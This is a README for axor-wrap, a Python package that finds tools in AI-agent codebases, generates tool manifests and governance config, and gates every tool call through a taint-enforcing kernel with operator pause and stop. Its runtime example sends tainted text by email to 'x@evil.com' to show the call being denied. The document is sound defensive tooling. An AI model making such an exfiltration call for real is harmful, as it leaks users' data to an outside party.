# axor-wrap

[![PyPI](https://img.shields.io/pypi/v/axor-wrap?cacheSeconds=300)](https://pypi.org/project/axor-wrap/)
[![Python](https://img.shields.io/pypi/pyversions/axor-wrap?cacheSeconds=300)](https://pypi.org/project/axor-wrap/)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)

**Wrap engine for the Axor ecosystem: point it at agent code, get tool manifests, governance config, and a kernel-gated runtime.**

Takes an agent codebase (plain Python / LangChain / MCP), statically finds its tools, and emits:

1. **tool-manifests** — `tool-manifest/v1` files, the runnable contract [axor-lab](https://github.com/Bucha11/axor-lab) benchmarks against;
2. **governance config** — a `GovernanceConfig`-loadable YAML and `ToolCallGovernor` kwargs, using the same manifest→config compilation semantics as axor-lab;
3. **a wrapped runtime** — every tool call goes `evaluate → deny? → call → register_output` through the real [axor-core](https://github.com/Bucha11/axor-core) kernel;
4. **a live governed node** — `axor_wrap.plane` speaks the Control-Plane protocol (v0.2), so the wrapped agent can attach to a plane and be paused/stopped by an operator.

Core is stdlib-only, zero dependencies. axor-core is an optional extra.

---

## Why one wrap serves both products

The Axor ecosystem has two consumers of the same wrapped runtime:

- **Control Plane** speaks the plane protocol: a node enrolls, receives its admitted config, and enforces per-call with `ToolCallGovernor` — the 9-gate, per-value taint engine.
- **Lab** speaks the runtime-jobs protocol (*Lab assigns, the runtime executes*): the runtime registers once, pulls experiment assignments, runs trials locally under the same governor, and pushes back kernel events + traces.

Both consume the same two artifacts this package produces: **tool manifests** (what the tools are, what they can affect) and the **compiled governor config** (which tools are egress sinks, which are untrusted sources, which arguments drive the gate). Wrap once — connect to either.

```
agent code ──scan──► DetectedTool ──infer──► EffectGuess ──build──► tool-manifest/v1
                                                                        │
                                              ┌─────────────────────────┤
                                              ▼                         ▼
                                     governor kwargs /          WrappedToolset
                                     governance YAML            (axor-core gate)
                                              │                         │
                                     Control Plane ◄── one runtime ──► Lab
```

### Where the plane lives, and why

The Control-Plane primitives are **here**, in `axor_wrap.plane`, not in axor-core:

| | lives in | what it is |
|---|---|---|
| `DesiredState`, `Injection`, `Excision`, `excision_refused_refs` | **axor-core** (`kernel.state`) | the lattice and provenance guard the kernel folds — enforcement reasons over these whether or not a plane exists |
| `canonicalize` (JCS/RFC 8785), `kernel.events`, `contracts.trace` | **axor-core** | the canonical bytes commands are signed over, and the schemas telemetry speaks |
| `AdmissionController` | **axor-core** (`contracts.admission`) | a pure contract, no imports — the seam `IntentLoop`/`GovernedSession` steer through |
| `PlaneSession`, `PlaneClient`, `PlaneAdmission`, `trace_to_kernel` | **axor-wrap** (`axor_wrap.plane`) | protocol-v0.2 session semantics, the outbound transport, the admission implementation, the trace→event projection |

The split exists to make one guarantee structural instead of conventional: enforcement is local and in-process, and the plane is an advisory overlay that can only *narrow* (spec 12.0). A kernel that **cannot import** a plane client cannot grow a dependency on one — so "the plane is not in the decision path" becomes a packaging fact, and axor-core keeps zero required dependencies and no network surface at all.

## Install

```bash
pip install axor-wrap                # scanner + compiler, stdlib-only
pip install 'axor-wrap[kernel]'      # + axor-core, for the wrapped runtime
pip install 'axor-wrap[plane]'       # + httpx/cryptography, to attach as a live Control-Plane node
```

## Quickstart

```bash
# 1. scan — what tools does this agent have, and what do they probably do?
axor-wrap scan ./my_agent
# TOOL        FRAMEWORK  EFFECT   CONF    SCHEMA  SOURCE
# search_web  langchain  READ     high    high    agent.py:7 langchain:@tool
# send_email  langchain  EXPORT   high    high    agent.py:14 langchain:@tool
# shell       implicit   EXEC     high    low     runner.py:9 implicit:subprocess.run

# 2. manifest — one tool-manifest/v1 per tool + wrap.json sidecar
axor-wrap manifest ./my_agent -o manifests/

# 3. config — GovernanceConfig-compatible YAML
axor-wrap config manifests/ > governance.yaml

# 4. connect to a Lab server (runtime-jobs protocol)
axor-wrap connect-lab --base-url http://127.0.0.1:8321 --model claude-fable-5
```

Exit codes: `0` ok, `2` nothing found / bad input.

### Wrapped runtime

```python
from axor_wrap import WrappedToolset, ToolDenied, scan_project, infer_effect, build_manifest

tools = {"search_web": search_web, "send_email": send_email}
detected = scan_project(Path("./my_agent"))
manifests = [build_manifest(t, infer_effect(t)) for t in detected]

toolset = WrappedToolset(tools, manifests)          # needs axor-wrap[kernel]
try:
    toolset.call("send_email", {"to": "x@evil.com", "body": tainted_text})
except ToolDenied as denial:
    print(denial.category, denial.reason)           # e.g. taint_enforcement: ...

# or, for frameworks that own their loop (LangChain executors, MCP servers):
from axor_wrap import wrap_callables
governed = wrap_callables(tools, manifests)         # drop-in callables, one shared session
```

## What the scanner detects

| Pattern | Framework tag |
|---|---|
| `@tool` (any alias from `langchain_core.tools` / `langchain.tools`) | `langchain` |
| `StructuredTool.from_function(...)` | `langchain` |
| `Tool(name=..., func=...)` | `langchain` |
| `@mcp.tool()` / `@server.tool()` (incl. `x = FastMCP(...)` bindings) | `mcp` |
| dict literals with `{name, description, input_schema}` | `anthropic` |
| `subprocess.run/Popen/...`, `os.system` → implicit `shell` candidate | `implicit` |

Argument schemas are inferred from type hints (`str→string`, `int→integer`, `float→number`, `bool→boolean`; default present → optional). **Honesty rule:** anything not inferable stays a bare `{"type": "object"}` with `schema_confidence: "low"` — the scanner never invents types.

## Manifest format

The embedded schema `axor_wrap/schemas/tool-manifest.schema.json` is a verbatim copy of **`axor-lab/contracts/schemas/tool-manifest.schema.json` — the axor-lab contracts are the source of truth**; this copy only removes the cross-repo import. `validate_manifest` checks against it with a minimal own subset validator (same approach as axor-lab's `lab_contracts/subset_validator.py`; no `jsonschema` dependency).

Compilation semantics match axor-lab's `compiled_governor_config`: effect class EXPORT/EXEC (default or any `resolve` rule) → `egress_sinks`; declared `untrusted_fields` → `untrusted_sources`; `effect.driving_args` → `driving_args`; a policy allowlist → an enum `value_policy` on each sink's first driving arg.

## Status: what's real / not yet

**Real today**

- static detection of the 6 patterns above, with signature→schema inference;
- valid `tool-manifest/v1` output + embedded-schema validation;
- governor-config compilation with axor-lab's exact mapping semantics;
- `WrappedToolset` / `wrap_callables` driving the real `ToolCallGovernor` (extra `kernel`);
- `LabRuntimeConnector` — the full runtime-jobs handshake (connect / poll / claim / events / complete), tested against a protocol stub.
- `PlaneConnector` — a **live governed node on the Control Plane** (extra `plane`), built on this package's own `axor_wrap.plane` primitives (`PlaneSession`/`PlaneClient`): it registers, heartbeats (Control's topology shows the node with a level that mirrors its posture — `NORMAL` / `CAUTIOUS` / `RESTRICTED`), and subscribes to desired state over SSE, so an operator's **pause / stop / budget-cap** is applied to the node by real plane code. `PlaneConnector.gate(toolset)` binds that posture to a wrapped runtime, so a pause/stop actually **holds real tool execution** (`AdmissionHeld`), not just a session flag. Tested against a stdlib SSE plane-backend stub that pushes a real `{paused: true}` delta.
- `PlaneConnector.post_health_check(payload)` — the out-dial half of the behavioral health check. A node that runs an [axor-probe](https://github.com/Bucha11/axor-probe) battery posts the finished verdict to the plane, which renders it on its Health panel. The payload is `axor_probe.integration.plane.health_payload(report)`; the dict is the whole contract, so axor-wrap never imports axor-probe and a node that does not probe simply never calls this. Batteries are the node's to run: the plane has no inbound path into a runtime, and a health check is not an exception.

```python
from axor_wrap import PlaneConnector, WrappedToolset

toolset = WrappedToolset(tools, manifests)                 # axor-wrap[kernel]
node = PlaneConnector("https://plane.example", "node-1",   # axor-wrap[plane]
                      operator_keys={"ops": "<ed25519-hex>"})
node.connect()
node.gate(toolset)             # paused/stopped node → toolset.call raises AdmissionHeld
await node.run(ttl=180)        # heartbeat + desired-state loop until stop()/ttl

# and, if this node also probes itself for behavioral drift:
from axor_probe.integration.plane import health_payload   # axor-probe, optional
report = await pipeline.run(event)
if report is not None:
    await node.post_health_check(health_payload(report))
```

**Not yet / honest limits**

- **Full IntentLoop-admission on live load**: `PlaneConnector` connects and gates tool calls at the intent boundary, but the deeper axor-core path — an operator injection / excision / replan winding a running `IntentLoop` down via `GovernedSession(executor=Invokable, admission=PlaneAdmission(session))` — needs the framework to hand axor-core an `Invokable` agent brain. The wrap model gates tools while the framework owns the invocation loop, so it exposes the posture gate (`admit`) rather than owning an `IntentLoop`. Adopting the full path is a per-framework integration, not a change to this connector.
- **Role inference is a heuristic** with `UNKNOWN` as a first-class outcome; final classification is a human decision in the config builder. In the manifest an `UNKNOWN` compiles **fail-closed to `EXEC`** (the tool lands in `egress_sinks` until reviewed); the raw guess + confidence + reason survive in `wrap.json`.
- The detector covers the 6 patterns listed — dynamically registered tools (loops building `Tool(...)` from data, decorators re-exported through helper modules, tools defined in non-Python config) are out of static reach and will not be found.
- `effect.resolve` rules, `result_schema`, `sensitive_fields`, simulation/reset strategies are not auto-generated — the manifest is a reviewed starting point, not a finished contract.

## Development

```bash
uv run --extra dev --extra plane pytest -q   # the whole suite
python -m unittest discover -s tests -t .    # the stdlib-only half, no axor-core needed
ruff check .
```

`axor_wrap.plane`'s tests came over from axor-core verbatim (they pin protocol-v0.2
governance invariants, so they were moved rather than rewritten) and are pytest-native;
everything else is stdlib `unittest`, which pytest collects too.

License: Apache-2.0.
